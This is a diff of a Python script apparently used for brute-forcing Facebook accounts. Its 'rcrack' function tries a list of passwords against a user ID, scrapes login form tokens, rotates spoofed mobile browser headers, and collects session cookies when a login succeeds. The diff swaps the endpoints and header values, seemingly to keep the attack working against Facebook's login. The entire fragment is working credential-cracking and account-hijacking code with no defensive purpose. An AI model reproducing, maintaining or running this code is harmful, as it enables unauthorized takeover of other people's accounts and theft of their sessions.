@@ -242,7 +242,7 @@ def rcrack(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            free_fb = session.get('https://developer.facebook.com').text
+            free_fb = session.get('https://p.facebook.com').text
             log_data = {
             "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -253,33 +253,27 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'developer.facebook.com',
+            header_freefb = {'authority': 'p.facebook.com',
             'method': 'GET',
             'scheme': 'https',
-            'x-fb-rlafr': '0',
-            'access-control-allow-origin': '*',
-            'facebook-api-version': 'v16.0',
-            'strict-transport-security': 'max-age=15552000',
-            'pragma': 'no-cache',
-            'cache-control': 'private, no-cache, no-store, must-revalidate',
-            'x-fb-request-id': 'AVkvp5xaRmJlvLSVh6yZcZO',
-            'x-fb-trace-id': 'ECKbEwu+6l/',
-            'x-fb-rev': '1007202889',
-            'x-fb-debug': '38MdzEKtayv2w3Tf2jKDeBqx0OuKSOW/XE2RLHVCyttv36RP9rNVPsp3nIGRjfGpzl9PnzoM8QEZfZq45nM3Yw==',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
-            'referer': 'https://mbasic.facebook.com/?stype=lo&jlou=AffNHiEkem8kLgwWBIW3EFsu0vpg8RpRucM-p4NArG2I4LkBRWRd2GIJQ20-jmC9DxOZCAsAnG5MBoQ50ID8tvOP8QKWbPNraeqicU3CML1sqg&smuh=52779&lh=Ac8j6v9a_PfzQcLalAQ&refid=7&ref_component=mbasic_footer&_rdr',
-            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+            'dpr': '1.712499976158142',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.58"',
             'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '"Infinix X688B"',
             'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"11.0.0"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
+            'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
-            lo = session.post('https://developer.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
